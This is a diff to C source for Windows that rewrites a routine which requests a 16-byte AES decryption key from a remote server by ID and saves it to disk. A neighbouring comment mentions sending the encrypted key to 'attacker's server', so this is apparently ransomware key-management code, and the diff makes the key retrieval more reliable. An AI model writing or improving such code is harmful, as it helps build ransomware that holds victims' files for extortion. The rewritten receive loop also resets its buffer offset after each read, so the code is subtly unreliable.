@@ -356,26 +356,20 @@ int send_to_server(ULONGLONG id, const char *encrypted_key) {
     }
 }
 
-/* GET /api/decrypt/<id> and save 16-byte AES key to file */
 int get_from_server_and_save_key(ULONGLONG id) {
-
-    // Convert id to string
     char id_str[21];
     _ui64toa_s(id, id_str, sizeof(id_str), 10);
 
-    // Setup web environment
     if (ensure_web_setup() != 0) {
         web_cleanup();
         return -1;
     }
 
-    // Connect to server
     if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
         web_cleanup();
         return -1;
     }
 
-    // Build GET request
     char request[256];
     snprintf(request, sizeof(request),
              "GET /api/key/%s HTTP/1.1\r\n"
@@ -388,39 +382,64 @@ int get_from_server_and_save_key(ULONGLONG id) {
         return -1;
     }
 
-    // Receive response (small buffer is enough)
     char buffer[256];
-    int received = recv(sock, buffer, sizeof(buffer), 0);
-    if (received <= 0) {
+    int total = 0;
+    int headers_end = 0;
+    char *body_start = NULL;
+    char aes_key[16];
+    int body_received = 0;
+
+    while (body_received < 16) {
+        int r = recv(sock, buffer + total, sizeof(buffer) - total, 0);
+        if (r <= 0) {
+            web_cleanup();
+            return -1;
+        }
+        total += r;
+
+        if (!headers_end) {
+            body_start = strstr(buffer, "\r\n\r\n");
+            if (body_start) {
+                headers_end = 1;
+                body_start += 4; // skip headers
+
+                // Copy any body bytes already received
+                int available = (buffer + total) - body_start;
+                if (available > 16) available = 16;
+                memcpy(aes_key, body_start, available);
+                body_received = available;
+            }
+        } else {
+            // Copy remaining body bytes
+            int to_copy = 16 - body_received;
+            if (to_copy > r) to_copy = r;
+            memcpy(aes_key + body_received, buffer, to_copy);
+            body_received += to_copy;
+        }
+
+        // Reset buffer offset for next recv
+        total = 0;
+    }
+
+    char path[MAX_PATH];
+    if (get_relative_path(path, sizeof(path), "decryption_key.bin") != 0) {
         web_cleanup();
         return -1;
     }
 
-    // Find start of payload
-    char *body = strstr(buffer, "\r\n\r\n");
-    if (!body) {
-        web_cleanup();
-        return -1;
-    }
-    body += 4; // skip header delimiter
-
-    // Write exactly 16 bytes (AES-128 key) to file
-    char aes[MAX_PATH];
-    if (get_relative_path(aes, sizeof(aes), "decryption_key.bin") != 0) {
-        return 1;
-    }
-    FILE *fp = fopen(aes, "wb");
+    FILE *fp = fopen(path, "wb");
     if (!fp) {
         web_cleanup();
         return -1;
     }
 
-    fwrite(body, 1, 16, fp);
+    fwrite(aes_key, 1, 16, fp);
     fclose(fp);
-
     web_cleanup();
-    return 0;  // success
+
+    return 0;
 }
+
 
 
 /* Send encrypted key to attacker's server */
